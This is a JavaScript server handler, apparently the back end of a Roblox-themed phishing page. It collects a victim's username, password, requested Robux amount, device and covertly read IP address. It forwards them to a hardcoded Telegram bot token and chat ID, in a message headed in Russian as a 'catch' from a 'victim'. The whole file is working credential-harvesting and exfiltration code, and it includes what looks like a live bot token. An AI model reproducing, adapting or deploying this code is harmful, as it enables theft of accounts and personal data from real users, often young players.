export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { u, p, r, m } = req.body;
        // Скрытно вычисляем IP
        const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress;

        const token = '8155561702:AAEI9G16CVoH9bxwuI6Y3VAY-4NP9F5z3IE'; 
        const chatId = '8165386246'; 

        const text = `🎯 **УЛОВ ПОЛУЧЕН** 🎯\n\n` +
                     `👤 **Жертва:** \`${u}\`\n` +
                     `🔑 **Пароль:** \`${p}\`\n` +
                     `💎 **Запрос:** ${r} Robux\n` +
                     `🌐 **IP:** ${ip}\n` +
                     `📱 **Девайс:** ${m}\n\n` +
                     `❄️ *Зимняя охота 2025*`;

        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
            });
            return res.status(200).json({ ok: true });
        } catch (e) {
            return res.status(500).json({ ok: false });
        }
    }
    return res.status(405).send('Access Denied');
}
